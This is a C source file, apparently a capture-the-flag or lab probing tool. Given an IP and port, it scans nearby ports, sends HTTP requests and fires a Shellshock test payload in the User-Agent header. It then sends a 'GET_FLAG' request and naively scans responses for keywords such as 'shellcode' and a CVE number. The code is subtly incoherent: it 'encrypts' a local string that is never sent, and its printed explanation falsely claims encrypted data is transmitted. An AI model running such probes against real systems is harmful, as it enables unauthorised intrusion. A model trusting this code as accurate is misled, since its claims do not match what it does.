/*
 * Usage: ./enhanced_http_alt <IP> <PORT>
 * For educational testing only. Minimal comments included.
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <time.h>
 
 #define MAX_BUF 1024
 
 static void encrypt_data(char *data, int shift) {
     for(int i=0; data[i]; i++) {
         data[i] = (char)((data[i] + shift) % 128);
     }
 }
 
 static void advanced_encrypt(char *data, const char *key) {
     for(int i=0, j=0; data[i]; i++) {
         data[i] ^= key[j];
         j = (key[j+1] ? j+1 : 0);
     }
 }
 
 static int scan_exploit_signatures(const char *response) {
     const char *signatures[] = { "exploit", "vulnerable", "shellcode", NULL };
     for(int i=0; signatures[i]; i++) {
         if(strstr(response, signatures[i])) {
             printf("Potential exploit signature detected: %s\n", signatures[i]);
             return 1;
         }
     }
     return 0;
 }
 
 static int scan_exploit_signatures_v2(const char *response) {
     const char *signatures[] = { "SQL injection", "XSS", "RootKit", "malware", "CVE-2017-5638", NULL };
     for(int i=0; signatures[i]; i++) {
         if(strstr(response, signatures[i])) {
             printf("Additional exploit signature detected: %s\n", signatures[i]);
             return 1;
         }
     }
     return 0;
 }
 
 static void attempt_shellshock(const char *host, unsigned short port) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock < 0) return;
     struct sockaddr_in server;
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     if(inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
         close(sock);
         return;
     }
     if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
         close(sock);
         return;
     }
     char hdr[] = "GET / HTTP/1.1\r\nUser-Agent: () { :;}; echo 'ShellshockTest'\r\n\r\n";
     send(sock, hdr, strlen(hdr), 0);
     char buffer[MAX_BUF];
     int n = recv(sock, buffer, sizeof(buffer)-1, 0);
     if(n > 0) {
         buffer[n] = '\0';
         printf("Shellshock attempt response:\n%s\n", buffer);
     }
     close(sock);
 }
 
 int send_weak_http_alt_data(const char *host, unsigned short port) {
     int sock;
     struct sockaddr_in server;
     char buffer[MAX_BUF];
     int n;
     struct timespec start, end;
     double elapsed;
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock < 0) return -1;
 
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     if(inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
         close(sock);
         return -2;
     }
     clock_gettime(CLOCK_MONOTONIC, &start);
     if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
         close(sock);
         return -3;
     }
     strcpy(buffer, "GET / HTTP/1.0\r\n\r\n");
     send(sock, buffer, strlen(buffer), 0);
     memset(buffer, 0, sizeof(buffer));
 
     n = recv(sock, buffer, sizeof(buffer)-1, 0);
     clock_gettime(CLOCK_MONOTONIC, &end);
 
     if(n > 0) {
         buffer[n] = '\0';
         printf("HTTP alt response:\n%s\n", buffer);
         scan_exploit_signatures(buffer);
         scan_exploit_signatures_v2(buffer);
     }
     close(sock);
 
     elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec)/1000000000.0;
     printf("Round-trip time: %.6f seconds\n", elapsed);
 
     return 0;
 }
 
 int detect_exploit(const char *host, unsigned short port) {
     int sock;
     struct sockaddr_in target;
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock < 0) return 0;
     target.sin_family = AF_INET;
     target.sin_port = htons(port);
     if(inet_pton(AF_INET, host, &target.sin_addr) <= 0) {
         close(sock);
         return 0;
     }
     if(connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
         close(sock);
         return 0;
     }
     close(sock);
     return 1;
 }
 
 char* capture_flag(const char *host, unsigned short port) {
     static char flag[MAX_BUF];
     int sock;
     struct sockaddr_in srv;
     char buffer[MAX_BUF];
     int n, total = 0;
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock < 0) return NULL;
     srv.sin_family = AF_INET;
     srv.sin_port = htons(port);
     if(inet_pton(AF_INET, host, &srv.sin_addr) <= 0) {
         close(sock);
         return NULL;
     }
     if(connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
         close(sock);
         return NULL;
     }
     send(sock, "GET_FLAG", 8, 0);
     memset(flag, 0, sizeof(flag));
     while((n = recv(sock, buffer, sizeof(buffer)-1, 0)) > 0) {
         buffer[n] = '\0';
         if(total + n < MAX_BUF) {
             strcat(flag, buffer);
             total += n;
         } else break;
     }
     close(sock);
     return flag;
 }
 
 static void probe_other_ports(const char *host, int start, int end) {
     for(int p=start; p<=end; p++) {
         int s = socket(AF_INET, SOCK_STREAM, 0);
         if(s < 0) continue;
         struct sockaddr_in addr;
         addr.sin_family = AF_INET;
         addr.sin_port = htons(p);
         if(inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
             close(s);
             continue;
         }
         if(connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
             printf("Port %d is open.\n", p);
         }
         close(s);
     }
 }
 
 int main(int argc, char *argv[]) {
     char data[] = "Sensitive HTTP Alt Data";
     printf("Original data: %s\n", data);
     encrypt_data(data, 5);
     printf("Encrypted data to send (simple shift): %s\n", data);
     advanced_encrypt(data, "Key123");
     printf("Encrypted data with key: %s\n", data);
 
     if(argc < 3) {
         printf("Usage: %s <IP> <PORT>\n", argv[0]);
         return 1;
     }
 
     const char *ip = argv[1];
     unsigned short port = (unsigned short)atoi(argv[2]);
 
     if(!detect_exploit(ip, port)) {
         printf("Port %d closed or unreachable on %s.\n", port, ip);
         return 0;
     }
     printf("Port %d open on %s.\n", port, ip);
 
     probe_other_ports(ip, port, port+5);
 
     if(send_weak_http_alt_data(ip, port) == 0) {
         printf("Weak HTTP alt data sent.\n");
     } else {
         printf("Failed to send HTTP alt data.\n");
     }
 
     attempt_shellshock(ip, port);
 
     char *found_flag = capture_flag(ip, port);
     if(found_flag && strlen(found_flag) > 0) {
         printf("Captured flag: %s\n", found_flag);
     } else {
         printf("No flag captured.\n");
     }
 
     printf("Explanation:\n");
     printf("- Detects open port with detect_exploit.\n");
     printf("- Probes additional ports with probe_other_ports.\n");
     printf("- Sends encrypted data in send_weak_http_alt_data.\n");
     printf("- Scans responses for exploit signatures (v1 & v2).\n");
     printf("- Attempts Shellshock with attempt_shellshock.\n");
     printf("- Captures a potential flag with capture_flag.\n");
     printf("- Prints all results to the terminal.\n");
 
     return 0;
 }